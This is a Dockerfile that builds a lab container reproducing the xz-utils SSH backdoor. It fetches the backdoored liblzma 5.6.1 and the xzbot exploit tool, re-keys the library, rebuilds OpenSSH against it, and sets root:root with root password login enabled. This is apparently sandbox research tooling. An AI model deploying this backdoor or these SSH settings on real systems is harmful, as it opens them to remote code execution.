FROM debian:12 AS base

ENV DEBIAN_FRONTEND=noninteractive

# Basic networking + debugging tools + SSH
RUN apt-get update && apt-get install -y \
    iproute2 \
    iputils-ping \
    dnsutils \
    net-tools \
    tcpdump \
    curl \
    wget \
    ca-certificates \
    vim \
    git \
    autoconf \
    automake \
    libtool \
    zlib1g-dev \
    libssl-dev \
    make \
    xz-utils \
    python3 \
    python3-pip \
    python3.11-venv \
    && rm -rf /var/lib/apt/lists/*

RUN git clone https://github.com/amlweems/xzbot.git

FROM base AS ssh

RUN echo 'Acquire::Check-Valid-Until "false";' > /etc/apt/apt.conf.d/99snapshot && \
    printf "deb-src [check-valid-until=no] http://snapshot.debian.org/archive/debian/20240328T025657Z bookworm main\n" > /etc/apt/sources.list.d/openssh-snapshot.list

RUN apt-get update && apt-get install -y --no-install-recommends \
    build-essential dpkg-dev devscripts \
    git ca-certificates \
    xz-utils \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /build

RUN apt-get update && apt-get build-dep -y openssh && apt-get source openssh=1:9.2p1-2+deb12u2

RUN cd /build/openssh-* && \
    cp /xzbot/openssh.patch . && \
    patch -p1 < openssh.patch && \
    dpkg-buildpackage -b -uc -us

RUN apt-get update && apt-get install -y --no-install-recommends --allow-downgrades \
    /build/openssh-client_*.deb \
    /build/openssh-server_*.deb \
    /build/openssh-sftp-server_*.deb \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /


RUN mkdir -p /var/run/sshd && \
    echo 'root:root' | chpasswd && \
    sed -i 's/^#\?PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config

FROM base AS liblzma
# patch the backdoored libxzma object to use our own key
WORKDIR /src

RUN cp /xzbot/assets/liblzma.so.5.6.1 .
RUN python3 -m venv .venv
RUN . .venv/bin/activate && pip install pwntools
RUN shasum -a 256 liblzma.so.5.6.1
RUN . .venv/bin/activate && shasum -a 256 liblzma.so.5.6.1
RUN . .venv/bin/activate && python /xzbot/patch.py liblzma.so.5.6.1

# Install the binary
FROM base as binary

RUN apt-get update
RUN apt-get install -y golang

RUN go install github.com/amlweems/xzbot@latest
# Copy everything to a final image
FROM ssh AS final

WORKDIR /

COPY --from=liblzma /src/liblzma.so.5.6.1.patch .
COPY --from=binary /root/go/bin/xzbot /usr/local/sbin/

CMD ["/bin/bash"]
